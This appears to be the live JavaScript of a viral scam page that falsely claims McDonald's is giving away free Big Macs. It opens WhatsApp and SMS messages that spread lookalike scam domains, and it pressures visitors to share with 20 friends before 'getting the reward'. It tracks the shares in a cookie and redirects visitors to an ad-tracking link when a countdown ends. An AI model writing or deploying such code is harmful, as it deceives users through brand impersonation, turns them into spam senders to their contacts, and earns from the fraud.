var c = getCookie('c') ? getCookie('c') : 0,
		n = 300,
		date = new Date(),
		time = date.getDate() + "/" + ( date.getMonth() + 1 )  + "/" + date.getFullYear() + " " + date.getHours() + ":" + date.getMinutes() + ":" + date.getSeconds(),
		text = [ 'http://mcdonalds.com-win.top', 'http://mcdonalds.com-gratis.money', 'http://mcdonalds.com-win.top', 'http://mcdonalds.com-gratis.money' ], // random WhatsApp/sms 
		t = setInterval( function() {
			
			$( "#countdown" ).text( n-- ), -1 == n && window.open( "https://adsleaders.net/track/33/pe5ignd4-y5m3-j2lf-kwpf-yuf4x37gj4os", "_self" ) & clearInterval( t )
			
		}, 1e3 );

function fn1() {
	
	if ( /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test( navigator.userAgent ) ) {
		
		window.open( "whatsapp://send?text=McDonalds are giving away thousands of Big Macs for free to celebrate 50 Years of Big Mac 🍔🍟 %0D%0A" + text[ Math.floor( Math.random() * text.length ) ] + "", "_self" );
	   		
		c++;
		
		setCookie('c', c, 2);
		
		ga( 'send', 'event', 'WhatsApp', '[' + c + '][EN] Buono' );
		
		if ( c > 20 ) {
			
			window.open( 'https://adsleaders.net/track/33/pe5ignd4-y5m3-j2lf-kwpf-yuf4x37gj4os' );
			
		}
		
	} else {
		
		window.alert( 'You must share to get your reward.' );
		
	}
	
}

function fn2() {
	
	if ( c > 20 ) {
		
		window.open( 'https://adsleaders.net/track/33/pe5ignd4-y5m3-j2lf-kwpf-yuf4x37gj4os' );
		
	} else {
		
		window.alert( "You must share with 20 friends or 5 groups on WhatsApp to get your reward. You already told to " + c + " friends." );
		
	}
	
}

function fn3() {
	
	if ( /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test( navigator.userAgent ) ) {
		
		window.open( "sms:?body=Look %0D%0A %0D%0A  " + text[ Math.floor( Math.random() * text.length ) ] + " %0D%0A %0D%0A" + time, "_self" );
		
		c++;
		
		setCookie('c', c, 2);
		
		ga( 'send', 'event', 'sms', '[' + c + '][IT] Buono' );
		
		if ( c > 20 ) {
			
			window.open( 'https://adsleaders.net/track/33/pe5ignd4-y5m3-j2lf-kwpf-yuf4x37gj4os' );
			
		}
		
	} else {
		
		window.alert( 'You must share to get your reward.' );
		
	}
	
}

function setCookie(cname, cvalue, exdays) {
	var d = new Date();
	d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
	var expires = 'expires=' + d.toGMTString();
	document.cookie = cname+'='+cvalue+'; '+expires;
}

function getCookie(cname) {
	var name = cname+'=';
	var ca = document.cookie.split(';');
	for (var i = 0; i < ca.length; i++) {
		var c = ca[i];
		
		while (c.charAt(0) == ' ') c = c.substring(1);
		
		if (c.indexOf(name) === 0) {
			return c.substring(name.length, c.length);
		}
	}
	
	return '';
}

function isCookieSet(cname) {
	var name = cname+'=';
	var ca = document.cookie.split(';');
	for (var i = 0; i < ca.length; i++) {
		var c = ca[i];
		
		while (c.charAt(0) == ' ') c = c.substring(1);
		
		if (c.indexOf(name) === 0) {
			return true;
		}
	}
	
	return false;
}
